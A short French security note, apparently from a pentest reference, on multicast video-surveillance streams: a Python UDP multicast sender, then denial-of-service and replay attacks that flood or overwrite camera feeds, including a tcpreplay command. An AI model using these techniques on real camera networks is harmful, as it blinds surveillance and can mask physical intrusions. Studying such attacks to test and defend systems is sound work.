# Vidéo

Les caméras de vidéo surveillance peuvent émettre leur flux de 2 manières :&#x20;

* Unicast
* Multicast (UDP)

## Multicast

Sur un flux multicast, il est possible d'émettre et de recevoir du flux vidéo.

#### Emission

Pour émettre sur un flux multicast, il suffit d'envoyer des paquets UDP vers une adresse IP multicast (224.0.0.0 à 239.255.255.255) et sur un port choisi.

```
import socket

MCAST_GRP = "<IP>"
MCAS_PORT = <PORT>
MULTICAST_TTL = 2

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, MULTICAST_TTL)

sock.sendto(b"<DATA>", (MCAST_GRP, MCAST_PORT))
```

#### Réception

Pour recevoir du flux multicast, il faut s'abonner au groupe multicast de diffusion. Cet abonnement est réalisé à l'aide d'un paquet IGMP "Membership Report".

#### Déni de service

Il est possible de réaliser un déni de service sur le flux vidéo en utilisant le script présenté ci-dessus. Selon l'emplacement des attaquants, plus ou moins d'appareils de surveillance seront affectés.

Si l'attaque est réalisé en usurpant l'emplacement d'une caméra (branchement d'un TAP à une caméra) alors beaucoup, voir la totalité des appareils de surveillance seront affectés. Cependant, si l'attaquant est simplement connecté à un commutateur, seul les appareils de surveillance connectés à ce dernier risque d'être perturbés.

#### Rejeu

Il est possible de rejoué une séquence vidéo sur un flux multicast. Pour se faire, il faut enregistrer une séquence (avec wireshark par exemple) et la rejouer sur le réseau avec une fréquence d'émission supérieur à celle du flux légitime. Cela permet "d'effacer" le flux légitime.

```
sudo tcpreplay -i <INTERFACE> -tK --loop 1000 --duration=10 file.pcapng
```
